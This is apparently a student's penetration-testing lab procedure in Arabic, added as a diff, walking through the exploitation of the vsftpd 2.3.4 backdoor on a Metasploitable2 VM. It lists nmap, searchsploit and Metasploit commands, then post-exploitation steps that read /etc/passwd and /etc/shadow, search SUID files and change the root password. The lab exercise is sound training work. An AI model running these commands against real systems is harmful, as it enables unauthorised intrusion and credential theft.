@@ -1,0 +1,56 @@
+1) إعداد البيئة (Lab setup)
+- إنشاء VMs: Kali (الهجوم) و Metasploitable2 (الهدف).
+- ضبط الشبكة كـ  NAT حسب المتطلبات.
+- أخذ snapshot للـ Metasploitable2 
+
+2) الفحص الأولي (Scanning)
+- فحص كل البورتات: 
+  nmap -p- -sS <192.168.6.136> -> حفظ: nmap/01_all_ports.txt
+- فحص الخدمات والبانر على بورت 21:
+  nmap -sV -p21 -O -A <92.168.6.136> -> حفظ: evidence/ftp_21/ftp_21_01_nmap_banner.txt
+
+3) البحث عن استغلال (Exploit lookup)
+- استخدام searchsploit للبحث عن ثغرات vsftpd:
+  searchsploit vsftpd -> حفظ: evidence/ftp_21/ftp_21_02_searchsploit.txt
+- مراجعة معلومات الموديول في Metasploit (info, show options).
+
+4) إعداد Metasploit وتشغيل الاستغلال
+- داخل msfconsole:
+  use exploit/unix/ftp/vsftpd_234_backdoor
+  set RHOSTS <92.168.6.136>
+  set RPORT 21
+  set LHOST <92.168.6.137>
+  set LPORT 4444
+  run
+- شغّل spool لحفظ سجل الجلسة إذا أمكن:
+  spool /root/msf_vsftpd_run.txt
+  (بعد الانتهاء: spool -q)
+- نقل السجل إلى Kali: msf_outputs/ftp_21_03_msf_spool.txt
+
+5) الحصول على الوصول (PoC)
+- عند نجاح الاستغلال حصلت على شيل:
+  whoami -> output: root  -> حفظ: evidence/ftp_21/ftp_21_04_whoami.txt
+  id -> evidence/ftp_21/ftp_21_05_id.txt
+- أخذ لقطة شاشة للشيل ونتيجة whoami -> ملف داخل screenshots/
+
+6) بعد الاستغلال (Post‑exploitation)
+- جمع معلومات أساسية:
+  uname -a -> ftp_21_03_uname.txt
+  ls -la /root -> ftp_21_06_root_ls.txt
+  cat /etc/passwd | head -n50 -> ftp_21_07_passwd_head.txt
+  changed root password via FTP shell 
+  مقتطف آمن من /etc/shadow (أول أسطر) -> ftp_21_08_shadow_head.txt
+  find SUID -> ftp_21_09_suid_find.txt
+  netstat/ss -> ftp_21_10_netstat.txt
+- توثيق أي ملفات حساسة تم العثور عليها (نسخها إلى evidence مع مراعاة الخصوصية).
+
+7) التوثيق والحفظ
+- حفظ كل المخرجات واللقطات داخل:
+  ~/pentest_project/evidence/ftp_21/
+- حفظ فقرة PoC مختصرة في: ~/pentest_project/poC_vsftpd.txt
+
+8) الأرشفة والإنهاء
+- ضغط الأدلة للتسليم:
+  cd ~/pentest_project && zip -r submission_<yourname>_ftp21_evidence.zip evidence/ftp_21 poC_vsftpd.txt
+- استرجاع الـVM إلى snapshot (recommended) بعد توثيق كل شيء.
+
